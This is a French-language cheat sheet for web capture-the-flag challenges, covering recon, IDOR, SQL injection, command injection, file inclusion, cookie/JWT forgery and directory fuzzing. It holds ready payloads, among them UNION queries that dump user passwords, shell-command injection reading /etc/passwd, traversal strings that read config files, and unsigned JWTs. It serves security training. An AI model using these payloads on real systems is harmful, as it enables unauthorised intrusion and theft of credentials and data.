# 🚩 Guide CTF - Web Hacking

> Méthodes et conseils généraux pour les challenges CTF de type Web.

---

## 📋 Table des matières

1. [Reconnaissance initiale](#1--reconnaissance-initiale)
2. [Analyse de l'URL et des paramètres](#2--analyse-de-lurl-et-des-paramètres)
3. [IDOR - Insecure Direct Object Reference](#3--idor---insecure-direct-object-reference)
4. [Injection SQL](#4--injection-sql)
5. [Command Injection](#5--command-injection)
6. [LFI - Local File Inclusion](#6--lfi---local-file-inclusion)
7. [Manipulation de Cookies](#7--manipulation-de-cookies)
8. [Fichiers et routes cachés](#8--fichiers-et-routes-cachés)
9. [Outils utiles](#9--outils-utiles)

---

## 1. 🔍 Reconnaissance initiale

Avant toute attaque, toujours commencer par **observer et collecter des informations**.

### Code source de la page
- Clic droit → **Afficher le code source** (`Ctrl + U`)
- Chercher : commentaires HTML `<!-- -->`, fichiers JS/PHP référencés, champs cachés `<input type="hidden">`, indices dans le texte

### Outils développeur (`F12`)
- **Onglet Network** : observer toutes les requêtes HTTP envoyées/reçues
- **Onglet Application** : inspecter les cookies, le localStorage, le sessionStorage
- **Onglet Sources** : lire les fichiers JavaScript pour trouver des endpoints ou de la logique cachée
- **Onglet Console** : tester du code JavaScript directement

### Indices textuels sur la page
- Lire attentivement le texte affiché, il peut contenir des indices directs
- Un message comme *"Connecté en mode : user"* indique qu'un autre rôle existe
- Une mention de cookies ou de sessions est souvent un indice d'attaque

---

## 2. 🌐 Analyse de l'URL et des paramètres

### Structure d'une URL
```
https://site.com/page.php?id=1&role=user
                          └──────────────┘
                           Chaîne de requête (query string)
```

### Tester des paramètres dans l'URL
Même si l'URL ne contient pas de `?`, essayer d'en ajouter un manuellement :
```
https://site.com/page.php?id=1
https://site.com/page.php?debug=true
https://site.com/page.php?admin=1
https://site.com/page.php?role=admin
https://site.com/page.php?file=flag
```

### Valeurs classiques à tester
```
?id=0
?id=1
?id=-1
?id=admin
?id=null
?debug=true
?test=1
```

---

## 3. 🔓 IDOR - Insecure Direct Object Reference

**Principe** : accéder à des ressources d'autres utilisateurs en changeant un identifiant.

### Quand l'utiliser ?
- Quand l'URL contient un `id`, `user_id`, `file`, `doc`, etc.
- Quand le site affiche des données propres à un utilisateur

### Méthode
```
# Tu es connecté avec id=5, tu testes d'autres IDs
?id=0    → souvent admin ou données cachées
?id=1    → premier utilisateur (souvent admin)
?id=2    → deuxième utilisateur
?id=-1   → comportement inattendu
```

### Où chercher l'id ?
- Dans l'URL : `?id=5`
- Dans un cookie : `user_id=5`
- Dans le code source : `fetch('api.php?id=5')`
- Dans les requêtes réseau (`F12` → Network)

---

## 4. 💉 Injection SQL

**Principe** : injecter du SQL dans un paramètre pour manipuler la base de données.

### Tests de base
```
?id=1'                      → erreur SQL = vulnérable
?id=1 OR 1=1--              → retourne tous les résultats
?id=1 AND 1=2--             → retourne rien
```

### UNION SELECT (extraire des données)
```
?id=1 UNION SELECT 1--
?id=1 UNION SELECT 1,2--
?id=1 UNION SELECT 1,2,3--
# Ajouter des colonnes jusqu'à ne plus avoir d'erreur

# Extraire des infos
?id=1 UNION SELECT table_name,2 FROM information_schema.tables--
?id=1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--
?id=0 UNION SELECT username,password FROM users--
```

### Contournements classiques
```
-- (commentaire MySQL)
# (commentaire MySQL)
/*commentaire*/
' OR '1'='1
admin'--
```

---

## 5. ⚙️ Command Injection

**Principe** : injecter des commandes système dans un champ vulnérable.

### Séparateurs à tester
```
commande_normale ; ls
commande_normale && ls
commande_normale | ls
commande_normale || ls
commande_normale %0a ls     ← saut de ligne encodé (souvent nécessaire)
commande_normale `ls`
commande_normale $(ls)
```

### Commandes utiles en CTF
```bash
ls                          # lister les fichiers
ls -la                      # lister avec fichiers cachés
cat flag.txt                # lire un fichier
cat /etc/passwd             # fichier système classique
pwd                         # répertoire actuel
whoami                      # utilisateur actuel
find / -name "flag*"        # chercher un fichier
```

### Exemple complet
```
# Si le site fait : ping [VOTRE_INPUT]
127.0.0.1%0als              # liste les fichiers
127.0.0.1%0acat flag.txt    # lit le flag
```

---

## 6. 📂 LFI - Local File Inclusion

**Principe** : forcer le serveur à inclure et afficher un fichier local.

### Quand l'utiliser ?
- URL avec `?page=`, `?file=`, `?include=`, `?path=`

### Payloads classiques
```
?page=../../../../etc/passwd
?file=../../../etc/passwd
?page=....//....//....//etc/passwd      ← contournement de filtres
?page=/etc/passwd
```

### Lire le code source PHP (très utile en CTF)
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
```
→ La réponse est en **Base64**, à décoder sur [base64decode.org](https://www.base64decode.org)

### Fichiers intéressants à lire
```
/etc/passwd
/etc/hosts
../config.php
../flag.txt
../secret.txt
../database.php
```

---

## 7. 🍪 Manipulation de Cookies

**Principe** : modifier les cookies stockés dans le navigateur pour changer son rôle ou ses permissions.

### Accéder aux cookies
`F12` → **Application** → **Cookies** → choisir le domaine

### Méthode 1 : Modification directe
```
role = user       →   role = admin
isAdmin = false   →   isAdmin = true
mode = guest      →   mode = superuser
```
Double-clic sur la valeur → modifier → **Entrée** → **F5** pour recharger

### Méthode 2 : Cookie encodé en Base64
```
dXNlcg==   →   décoder   →   "user"
             modifier
YWRtaW4=   →   encoder   →   "admin"
```
Outils : [base64decode.org](https://www.base64decode.org) / [base64encode.org](https://www.base64encode.org)

### Méthode 3 : Cookie JWT
Format reconnaissable : `xxxxx.yyyyy.zzzzz`
```
eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx
```
- Décoder sur [jwt.io](https://jwt.io)
- Modifier le payload (`role: "admin"`)
- Si l'algorithme est `none`, supprimer la signature
- Ré-encoder et remplacer le cookie

### Activer les modifications
Après toute modification de cookie :
```
Entrée (pour confirmer) → F5 (pour recharger la page)
```
ou
```
Ctrl + Shift + R (recharge sans cache)
```

---

## 8. 🗂️ Fichiers et routes cachés

### Fichiers à tester systématiquement
```
/robots.txt
/sitemap.xml
/.htaccess
/backup.php
/admin.php
/config.php
/flag.txt
/secret.txt
/.git/
/backup/
/old/
```

### Outils de fuzzing
```bash
# avec ffuf
ffuf -u https://site.com/FUZZ -w wordlist.txt

# avec gobuster
gobuster dir -u https://site.com -w wordlist.txt
```

### Wordlists recommandées
- [SecLists](https://github.com/danielmiessler/SecLists) → `Discovery/Web-Content/common.txt`

---

## 9. 🛠️ Outils utiles

| Outil | Usage | Lien |
|-------|-------|------|
| **Burp Suite** | Intercepter et modifier les requêtes HTTP | [portswigger.net](https://portswigger.net/burp) |
| **jwt.io** | Décoder/modifier des tokens JWT | [jwt.io](https://jwt.io) |
| **base64decode.org** | Décoder du Base64 | [base64decode.org](https://www.base64decode.org) |
| **CyberChef** | Encodage/décodage/crypto | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| **ffuf** | Fuzzing de fichiers/répertoires | [github.com/ffuf/ffuf](https://github.com/ffuf/ffuf) |
| **sqlmap** | Automatiser l'injection SQL | [sqlmap.org](https://sqlmap.org) |
| **SecLists** | Wordlists pour fuzzing | [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |

---

## 🧠 Réflexe général face à un challenge web

```
1. Lire attentivement le texte de la page (indices cachés en pleine vue)
2. Afficher le code source (Ctrl + U)
3. Ouvrir F12 → Network, Application, Sources
4. Analyser l'URL et tester des paramètres
5. Inspecter et modifier les cookies
6. Tester les fichiers cachés (/robots.txt, /admin.php...)
7. Tenter une injection (SQL, commande, LFI) selon le contexte
```

> 💡 **Conseil** : toujours lire les indices avec attention, ils orientent directement vers la bonne technique.
